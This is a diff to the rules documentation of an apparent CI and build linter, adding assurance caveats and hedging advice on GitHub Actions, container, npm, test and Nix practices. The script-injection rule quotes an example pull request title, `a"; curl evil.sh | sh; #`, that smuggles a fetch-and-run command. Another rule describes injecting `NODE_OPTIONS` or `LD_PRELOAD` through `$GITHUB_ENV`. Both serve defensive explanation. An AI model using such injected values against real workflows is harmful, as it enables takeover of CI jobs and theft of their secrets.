@@ -1593,6 +1637,7 @@ A pnpm-workspace Dockerfile copies every workspace package.json before `pnpm ins
 
 **Why:** Copying workspace manifests before installation can invalidate the install layer on non-dependency edits. A warm pnpm store or cache mount may already avoid downloads. pnpm fetch can separate dependency fetching from manifest changes, but also depends on pnpm version, workspace configuration, patches, authentication and relevant build inputs. An offline install still performs linking and may run lifecycle scripts. Preserve frozen-lock policy and all required inputs, then benchmark.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`
 
@@ -1630,6 +1675,7 @@ Potentially emulated multi-platform builds are candidates for measured native-ru
 
 **Why:** Registering QEMU and requesting a foreign platform does not establish that build steps execute under emulation: native remote nodes, fixed-platform stages, cross-compilation, pruning and cache hits may avoid it. Where measurements show emulated compilation/compression, native nodes or cross-compilation can help. Compare full build and publication costs, verify hosted-runner availability, and preserve every platform, tag, artifact and test requirement.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: high
 - Presets: `strict`
 
@@ -1678,6 +1724,7 @@ The same tools are installed at runtime in several jobs instead of being baked i
 
 **Why:** Repeated tool installation specifications may be worth consolidating, but downloads can already be cached and versions may already be pinned. A job container replaces installation work with image build/pull/maintenance costs and changes OS, user, shell, networking and action compatibility. Tags are mutable: a reviewed image digest identifies the intended image. Benchmark and validate the migration; repeated command text is not proof of repeated network work or equivalent artifacts.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: low
 - Presets: `insights`
 - Options: `minJobs` (default `2`)
@@ -1714,10 +1761,11 @@ References:
 
 ### containers/shared-base
 
-Dockerfiles that repeat the same base image and toolchain preamble should share a base image published to GHCR.
+Review repeated base-image and toolchain preambles for possible shared-base reuse.
 
-**Why:** When several services start from the same image and install the same toolchain, every service build and every runner repeats that work and stores its own copy of the layer. Publishing the preamble once as a shared base image (referenced by digest) builds it once, lets every service and agent sandbox pull the identical cached layer, and turns toolchain upgrades into a single reviewed digest bump.
+**Why:** A published shared base can move repeated toolchain installation into a separate build, but existing layer caches may already reuse that work. Compare build savings with publication and image-pull costs, preserve platform and per-service requirements, and maintain reviewed digest updates. Matching preamble text alone does not prove equivalent execution or a speedup.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `insights`
 - Requires: `complete-inventory`
@@ -1752,6 +1800,7 @@ A job with service containers waits for them with a fixed `sleep` instead of a `
 
 **Why:** A fixed sleep may wait longer than a useful readiness probe or fail on a slow start. However, the image may already define HEALTHCHECK and the sleep may await unrelated work. An explicit probe helps only if it tests the same readiness condition; polling intervals, retries and credentials affect correctness and latency. This rule observes a sleep and absent workflow-level health command, not the image's configuration or the sleep's purpose.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `minSeconds` (default `5`)
@@ -1797,6 +1846,7 @@ Library packages should declare an `exports` map, and ESM libraries a `sideEffec
 
 **Why:** An `exports` map is the package's public API: it blocks deep imports into internals, so packages can be split, moved, and rebuilt independently without breaking consumers, and it lets bundlers and TypeScript resolve the right entry without probing. `sideEffects` tells bundlers which modules are safe to drop, which keeps tree-shaking effective and app bundles (and their build times) small.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`, `agentic`
 
@@ -1842,6 +1892,7 @@ Publishable packages should declare a `files` allowlist (or an `.npmignore`) so 
 
 **Why:** Without an allowlist `npm publish` packs the whole package directory: sources, tests, fixtures, configs, and stray build caches. Bloated tarballs make every install, CI cache restore, and container layer that contains node_modules larger and slower, and can leak files that were never meant to be published. A `files` allowlist keeps composable packages small.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`
 - Requires: `complete-inventory`
@@ -1881,6 +1932,7 @@ Packages with very many dependencies are candidates for decomposition into small
 
 **Why:** A package that pulls in everything is one cache key: any change to it, or to any of its dependencies, reinstalls, rebuilds, and retests the whole thing, and every image that contains it ships all of it. Smaller packages with explicit boundaries let affected-only CI, remote caches, and OCI layers reuse work, which is what keeps agentic edit-test loops fast.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `insights`
 - Options: `maxDependencies` (default `40`), `maxWorkspaceDependents` (default `0`)
@@ -1919,6 +1971,7 @@ Workspace packages should declare each third-party dependency with the same vers
 
 **Why:** When packages in one monorepo ask for different ranges of the same dependency, the lockfile carries several copies, installs and node_modules grow, Docker dependency layers and CI caches fragment by package, and packages behave differently at runtime and in tests. A single version policy keeps one hermetic dependency set that every package and image layer can share.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`
 - Options: `ignore` (default `[]`)
@@ -1959,6 +2012,7 @@ Container images built in CI should be published to GitHub Container Registry (g
 
 **Why:** Publishing to GHCR keeps images next to the code: the workflow's GITHUB_TOKEN can push without long-lived registry secrets, packages inherit organization permissions and link to the repository, and runners pull from GHCR without Docker Hub's anonymous rate limits. Shared base and dependency layers published once to GHCR can then be reused by every service in the monorepo.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: info; impact: low
 - Presets: `github`
 
@@ -2006,6 +2060,7 @@ Internal scoped npm packages should be published to the GitHub npm registry (npm
 
 **Why:** Publishing internal packages to GitHub Packages keeps them next to their source: Actions publish and install with the workflow's GITHUB_TOKEN instead of long-lived npm tokens, access follows organization and repository permissions, and small composable packages can be versioned and consumed independently by every repository and container build in the organization.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: info; impact: low
 - Presets: `github`
 - Options: `scopes` (default `[]`)
@@ -2045,6 +2100,7 @@ Attacker-controlled values must not be written to `$GITHUB_ENV`, `$GITHUB_PATH`,
 
 **Why:** Lines written to `$GITHUB_ENV` become environment variables for every later step, and `$GITHUB_PATH` entries change which binaries run. A branch name or issue title containing a newline can append its own `NODE_OPTIONS=--require=...`, `LD_PRELOAD`, or `PATH` entry and take over subsequent steps, including ones holding secrets. Interpolated values written to `$GITHUB_OUTPUT` can likewise forge outputs consumed by later jobs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2076,6 +2132,7 @@ Workflows should declare least-privilege `permissions:` for the `GITHUB_TOKEN`, 
 
 **Why:** Without a `permissions:` block the token gets the repository or organization default, which on older repositories is read/write to almost every scope. Any compromised dependency, action, or injected script inherits that access. Declaring the scopes each job needs limits the blast radius; on `pull_request_target`, `issue_comment`, and `workflow_run`, where outside contributors influence what runs, write access to contents lets an attacker push code, and write access to pull requests or issues in a job that also runs untrusted code or input lets them approve changes or spam the tracker.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2117,6 +2174,7 @@ Attacker-controlled `${{ }}` values (titles, bodies, branch names, commit messag
 
 **Why:** Expressions are substituted into the script text before the shell or JavaScript runtime parses it, so a pull request title like `a"; curl evil.sh | sh; #` becomes code. The job then runs that code with its token and secrets. Passing the value through an environment variable makes it plain data that the script reads at run time.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2147,6 +2205,7 @@ Package installs in privileged workflows that hold secrets or a write token shou
 
 **Why:** npm, yarn, and pnpm run `preinstall`/`install`/`postinstall` scripts from every dependency by default. In a job that triggers on `pull_request_target`, `workflow_run`, or `issue_comment` and also holds secrets or a writable token, a single compromised or attacker-controlled package can read those credentials during the install. Disabling lifecycle scripts, and running only the specific builds you need afterwards, keeps install-time code away from the credentials.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `strict`
 
@@ -2190,6 +2249,7 @@ Tools installed straight from a git repository or `@latest` should be pinned to 
 
 **Why:** Installing from a branch (or a repository's default branch) runs whatever code that branch holds at the moment the job starts. A force-push, a compromised maintainer account, or a hijacked repository silently changes what CI executes, and the run cannot be reproduced later. Pinning to a full commit SHA or a released version makes the dependency immutable and reviewable.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2221,6 +2281,7 @@ References:
 
 **Why:** By default `actions/checkout` writes the job's token into `.git/config` so later git commands can authenticate. Any later step can read it, and an artifact that includes the `.git` directory publishes it to anyone who can download the artifact. When the job does not push, disabling credential persistence removes the token from disk entirely.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium; autofix available
 - Presets: `recommended`, `agentic`
 
@@ -2260,6 +2321,7 @@ Workflows triggered by `pull_request_target`, `workflow_run`, or `issue_comment`
 
 **Why:** The Actions cache is shared across workflows on the same branch scope. A cache entry written by untrusted code (for example a pull request build on the default branch's scope, or a privileged job that ran contributor code) can be restored into a privileged job, which then executes the poisoned binaries with secrets and a write token. Privileged workflows should build from clean inputs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `strict`
 
@@ -2301,6 +2363,7 @@ Workflows must not serialize the whole `secrets` context with `toJSON(secrets)` 
 
 **Why:** `toJSON(secrets)` hands every repository and organization secret to a single step, so one compromised action or script leaks all of them; it also defeats per-job least privilege. Printing a secret relies entirely on log masking, which misses transformed values (base64, substrings, JSON escapes) and leaves the value in step summaries or downstream tools. Pass only the specific secrets a step needs through `env:` and never write them to stdout.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2333,6 +2396,7 @@ References:
 
 **Why:** These triggers run in the base repository's context with its secrets and a token that can write. Checking out the contributor's head commit and then running a build, test, script, or local action executes attacker-authored code with those privileges (a "pwn request"). Run untrusted code in a `pull_request` workflow instead, and hand results to the privileged workflow as data.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2378,8 +2442,9 @@ References:
 
 Avoid chaining workflows with `workflow_run` when the downstream work could be a dependent job.
 
-**Why:** A `workflow_run` trigger only fires after the upstream workflow finishes, so the downstream work waits for a second queue slot, a fresh runner, and another checkout before it starts. When pull request volume is high those extra hops add minutes to every change and make the run graph harder to follow. Calling the downstream work as a reusable workflow job with `needs:` keeps it in the same run, shares artifacts directly, and starts it the moment its dependencies succeed.
+**Why:** A completed `workflow_run` subscription waits for the upstream workflow, which may include jobs the follow-up does not need. A dependent job can express narrower prerequisites, but it still has scheduling and runner costs; consolidation does not guarantee a faster run. Preserve deliberate privilege boundaries, trigger semantics and artifact dependencies, then measure whether the changed dependency graph reduces waiting.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -2417,6 +2482,7 @@ Avoid throttling a matrix with a `max-parallel` far below its number of legs.
 
 **Why:** A matrix exists to fan work out across runners. Setting `strategy.max-parallel` to 1, or to a small fraction of the matrix size, turns that fan-out back into a queue: wall-clock time grows with every leg while the total minutes billed stay the same. When agents open many pull requests, that latency stacks up across every change. Serializing is only worth it when legs genuinely contend for a shared resource, which is better expressed with `concurrency` or an environment.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `agentic`, `strict`
 - Options: `maxRatio` (default `4`)
@@ -2451,6 +2517,7 @@ Skip expensive pull request jobs while the pull request is still a draft.
 
 **Why:** Coding agents typically open a draft pull request early and push many intermediate commits before asking for review. Every push re-runs the full pull request workflow, so matrices and long suites burn minutes on work nobody will look at yet. Gating the expensive jobs on `github.event.pull_request.draft == false` and listening for `ready_for_review` keeps fast feedback on drafts while running the heavy checks exactly once the change is ready.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 - Options: `maxSteps` (default `10`), `maxTimeout` (default `15`)
@@ -2493,6 +2560,7 @@ Do not re-run build and test workflows on pull request metadata events such as l
 
 **Why:** Activity types like `edited`, `labeled`, and `assigned` fire when a title, label, or assignee changes, not when code changes. Build and test workflows that listen for them repeat identical work on the same commit, and triage bots or agents that relabel pull requests can trigger several full runs in a row. Listening only for code activity, or filtering the jobs on the specific action or label, keeps those events cheap.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2525,6 +2593,7 @@ Avoid scheduled workflows that run more often than every 15 minutes.
 
 **Why:** A cron schedule runs whether or not anything changed, so a workflow that fires every few minutes spends runner time around the clock and competes with pull request checks for the same concurrency pool. GitHub also delays or drops scheduled runs during periods of high load, so very tight schedules rarely deliver the freshness they promise. Event triggers such as `push`, `workflow_dispatch`, or `repository_dispatch` react to real changes; when polling is unavoidable, a 15-minute or longer interval is usually enough.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `maxRunsPerHour` (default `4`)
@@ -2558,6 +2627,7 @@ Let sharded pull request test matrices stop early when one shard fails.
 
 **Why:** When a test suite is split into shards, each leg runs a slice of the same suite against the same commit. With `fail-fast: false`, a failure in one shard still lets every other shard run to completion, even though the pull request is already red and will need another push. Keeping the default `fail-fast: true` on pull requests cancels the remaining shards and returns those minutes to the queue, which matters most when many agent-authored pull requests are iterating at once.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -2591,6 +2661,7 @@ Gate matrix jobs on the workflow's existing change-detection job.
 
 **Why:** When a workflow already computes which paths a pull request touched and uses that result to skip some jobs, a matrix job that ignores it runs every leg on every pull request, including documentation-only or unrelated changes. Matrices are the most expensive jobs in a workflow, so they gain the most from the same gate. Adding the change job to `needs:` and an `if:` on its outputs lets the matrix skip cleanly when its inputs did not change.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -2632,10 +2703,11 @@ References:
 
 ### redundancy/duplicate-setup-step
 
-A job should not run the same toolchain setup action twice with the same inputs.
+Review repeated toolchain setup declarations with matching visible inputs.
 
-**Why:** Running a setup action a second time with identical inputs reinstalls the same toolchain, adds download and cache-restore time to every run, and usually signals a copy-paste mistake that hides which configuration is authoritative.
+**Why:** Repeated setup declarations may add avoidable work, but tool caches can avoid downloads and intervening steps can change the environment or toolchain. Matching visible inputs alone does not establish that the second setup is redundant. Verify conditions, outputs and environment requirements before removing it.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: low
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2674,6 +2746,7 @@ Jobs that repeat the same leading setup steps could share a composite action.
 
 **Why:** When many jobs open with the same checkout, toolchain, and install steps, every change to that setup (a new cache key, an action upgrade, a registry login) has to be made in each copy. Copies drift, and drifted setup is a common source of 'works in one job, fails in another'. A local composite action keeps one definition.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: low
 - Presets: `insights`
 - Options: `minJobs` (default `3`), `minSteps` (default `3`)
@@ -2723,8 +2796,9 @@ References:
 
 Several jobs in a workflow should not each rebuild the same project from scratch.
 
-**Why:** When multiple jobs run the same build command on the same runner type, the workflow pays for the build several times and the jobs may test or ship slightly different outputs. Building once and passing the result through an artifact cuts runner minutes and guarantees every downstream job uses the same bits.
+**Why:** Repeated build commands may duplicate work, but matching visible commands and runner labels do not establish equivalent inputs or outputs. Where consumers can safely share a verified immutable artifact, building once may reduce repeated work and align their inputs. Artifact transfer, serialization and changed critical paths can offset the saving; validate semantics and measure the result.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -2770,10 +2844,11 @@ References:
 
 ### redundancy/duplicate-command
 
-A job should not run the same non-trivial shell command more than once.
+Review repeated non-trivial shell commands for potentially redundant work.
 
-**Why:** Repeating an install, build, or test command in one job repeats its cost on every run. It is usually left over from merging two step lists and makes it unclear which invocation the job actually depends on.
+**Why:** Repeated command text can indicate avoidable work, but identical text does not establish identical effects or cost: files, environment, tool caches and external state may have changed. Check conditions and intervening effects before removing an invocation, then measure any savings.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`
 
@@ -2806,6 +2881,7 @@ A job or step should not redefine an environment variable to the value it alread
 
 **Why:** Workflow-level `env` is inherited by every job and step. Repeating the same `KEY: value` lower down adds noise and creates a second copy that must be changed in lockstep; when only one copy is updated, the inner one silently wins.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low; autofix available
 - Presets: `recommended`, `strict`
 
@@ -2842,6 +2918,7 @@ Workflows should agree on the toolchain version they install with each setup act
 
 **Why:** When one workflow installs Node 20 and another Node 22, or Python 3.11 versus 3.12, CI validates on one runtime and releases on another. These pins are usually updated one file at a time, so they drift. A single version file read by every setup step keeps them aligned. This covers language toolchains installed by setup actions, not package dependency versions.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -2877,10 +2954,11 @@ References:
 
 ### testing/playwright-browser-cache
 
-Jobs that download Playwright browsers should cache them or run in the Playwright container image.
+Evaluate browser reuse when Playwright downloads are a measured bottleneck.
 
-**Why:** `playwright install` downloads several hundred megabytes of browser builds on every run. Restoring ~/.cache/ms-playwright keyed on the Playwright version (or using the image that ships the browsers) turns that download into a cache hit.
+**Why:** `playwright install` may download missing browser builds; runner images or existing caches may already supply them. Restoring an archive can cost as much as downloading the browsers, and Linux OS dependencies still need installation. Inspect actual install/restore timings and version/platform compatibility before choosing a browser cache or matching Playwright image.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2916,8 +2994,9 @@ References:
 
 ESLint, tsc and Jest should keep their incremental caches between CI runs.
 
-**Why:** ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can skip unchanged files, but hosted runners start empty. Persisting their cache files makes repeat runs, including agent iterations on a pull request, proportional to what changed.
+**Why:** ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can reuse compatible prior work. Fresh jobs may lack that state, but persistent runners and tool-managed caches can already provide it. Cache restoration, invalidation and upload costs can outweigh savings; measure repeat runs rather than assuming runtime becomes proportional to changed files.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `agentic`, `strict`
 
@@ -2955,6 +3034,7 @@ Test runners and compilers in CI should run once instead of in watch mode.
 
 **Why:** A watcher never exits on its own: `jest --watch`, `vitest watch`, `karma start` or `ng test` without single-run keeps the job alive until the job timeout (six hours by default), burning runner minutes and blocking the merge signal.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2981,10 +3061,11 @@ References:
 
 ### testing/unconditional-debug-upload
 
-Uploads of test debugging output (reports, traces, videos, screenshots) should run only when tests fail.
+Consider failure-only uploads for test artifacts used solely for debugging.
 
-**Why:** A step without `if:` runs only after earlier steps succeed, so a debugging upload placed after the tests uploads megabytes of traces and screenshots on every green run and nothing when the tests fail. `if: failure()` uploads exactly when the output is needed.
+**Why:** A step's default success condition can skip a debugging upload after an earlier unhandled failure. When successful-run artifacts are not needed, `if: failure()` may avoid unnecessary transfers while retaining failure diagnostics. Visible conditions and consumers are only a heuristic: verify artifact consumers, continue-on-error behavior and diagnostic needs before changing the condition.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low; autofix available
 - Presets: `agentic`, `strict`
 
@@ -3023,6 +3104,7 @@ Test failures should fail the job, not be silenced by `continue-on-error: true` 
 
 **Why:** When a failing test step is allowed to pass, the check stays green, regressions merge unnoticed and the minutes spent running the tests buy no signal. Agents that iterate until CI is green are especially misled by a check that cannot fail.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3048,10 +3130,11 @@ References:
 
 ### testing/cache-disabled-install
 
-Jobs that restore a package-manager cache should not clear or bypass that cache in their run steps.
+Review installs that appear to clear or bypass a configured package-manager cache.
 
-**Why:** Restoring a dependency cache costs a download and a save on every run; clearing it, pointing installs at an empty temporary cache or passing `--no-cache-dir` throws that work away and makes every install download from the registry again.
+**Why:** Clearing or bypassing compatible restored package-manager entries can cause avoidable work. Restore/save operations are conditional, and clearing a cache does not necessarily require a registry download. Verify actual cache paths, command ordering, install behavior and any correctness or isolation requirement before changing the workflow.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `agentic`, `strict`
 
@@ -3085,8 +3168,9 @@ References:
 
 Run steps should wait for services to become ready instead of sleeping for a fixed time.
 
-**Why:** A fixed `sleep` before tests is a guess: on a fast runner it wastes the whole interval on every run, and on a slow or busy runner it is too short and the tests fail intermittently. Polling for readiness returns as soon as the service is up and fails clearly when it never comes up.
+**Why:** A fixed delay can outlast service startup or finish before the service is ready. A bounded readiness check can reduce unnecessary waiting and report timeout failures, but its health predicate, polling interval and timeout must match the workload. Preserve deliberate rate-limiting or propagation delays rather than assuming every sleep is redundant.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `minSeconds` (default `5`)
@@ -3121,6 +3205,7 @@ Nix accepts `nixConfig` from flakes that a pull request can modify.
 
 **Why:** accept-flake-config allows eligible nixConfig settings from an evaluated flake without the usual confirmation. If a pull request controls that flake, it can influence settings such as substituters and trusted keys. Which settings take effect, and with what privilege, depends on Nix version, single-user versus daemon installation, trusted-user policy and CLI overrides; this detector does not establish root execution or cache compromise. Keep configuration policy outside untrusted flake content, especially when pull_request_target checks out the head or a persistent runner/cache is exposed. Disabling this setting alone does not make executing untrusted workflow code safe.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3166,6 +3251,7 @@ References:
 
 **Why:** When demanded, an unpinned builtins.fetchurl call lacks a declared expected content digest. Download/cache behavior depends on Nix settings and availability, and pure evaluation rejects an unpinned demanded fetch. Importing the result may evaluate remote Nix code. A reviewed digest constrains bytes, not source trust or whole-build reproducibility. pkgs.fetchurl is a build-time fixed-output fetcher; substituting it into evaluation-time code can introduce IFD, so it is not a universally equivalent replacement.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3199,6 +3285,7 @@ References:
 
 **Why:** Channel subscriptions live outside the Nix expressions consuming them. A mutable channel URL can resolve differently after an update, while immutable snapshots, explicit search paths and recorded revisions can constrain or document the selection. Adding a channel alone does not establish that a build uses it. Prefer an explicit, reviewed dependency policy where frozen inputs are required; this detector does not establish reproducibility or the presence/absence of runtime provenance.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3233,6 +3320,7 @@ Nix expressions should not read `builtins.currentSystem`, the platform of the ma
 
 **Why:** builtins.currentSystem reads the evaluator's system/eval-system setting, not necessarily a remote builder's platform. If the value influences a derivation, different settings can select different outputs. Pure evaluation removes this constant, so a demanded reference fails; unused lazy expressions need not fail. Passing a system explicitly documents platform selection, but does not make different target platforms equivalent or prove reproducibility.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3266,6 +3354,7 @@ Several steps of one job each start the same `nix develop` / `nix-shell` environ
 
 **Why:** Every `nix develop --command` or `nix-shell --run` step starts Nix from scratch: it re-resolves the flake (or re-evaluates `shell.nix`, which has no evaluation cache and typically imports all of nixpkgs), realises the dev-shell environment, spawns a new bash that sources the stdenv setup, and re-runs the shell's `shellHook`, so hooks that install tools, create virtualenvs or print banners execute once per step. Loading the environment once with `nicknovitski/nix-develop` exports the shell's variables to `GITHUB_ENV` and its PATH entries to `GITHUB_PATH`, so later `run:` steps and third-party `uses:` actions see the toolchain without another Nix start. A job-level `defaults.run.shell: nix develop --command bash -e {0}` removes the repetition from the YAML but still starts `nix develop` in every step.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`
 - Options: `minSteps` (default `2`)
@@ -3302,6 +3391,7 @@ Container images built with `dockerTools.buildImage` put the whole closure in a 
 
 **Why:** buildImage adds a single layer above any reused base layers. A changed added layer can require transferring more data than a carefully layered image, unless the destination already has the blob. Layered builders separate selected store paths up to their layer limit and group the rest; resulting boundaries and reuse depend on the closure and settings. copyToRoot/contents and runAsRoot/fakeRootCommands are not equivalent APIs. Validate file layout, ownership, permissions and runtime behavior, then measure transfer sizes before migrating.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`, `insights`
 - Options: `allow` (default `[]`)
@@ -3341,6 +3431,7 @@ A flake input brings its own nixpkgs revision instead of following the flake's `
 
 **Why:** Distinct nixpkgs revisions can add source fetches, evaluation work and different derivations when those inputs are used. They do not imply that every package differs: unchanged derivations can still share store paths. A follows declaration changes the dependency revision and requires regenerating flake.lock; sharing a channel name does not establish compatibility. Review and test that change, including upstream binary-cache coverage, rather than applying it automatically.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `strict`
 
@@ -3371,6 +3462,7 @@ Placeholder hashes (`lib.fakeHash`, `""`, all-zero or `sha256-AAAA…` values) m
 
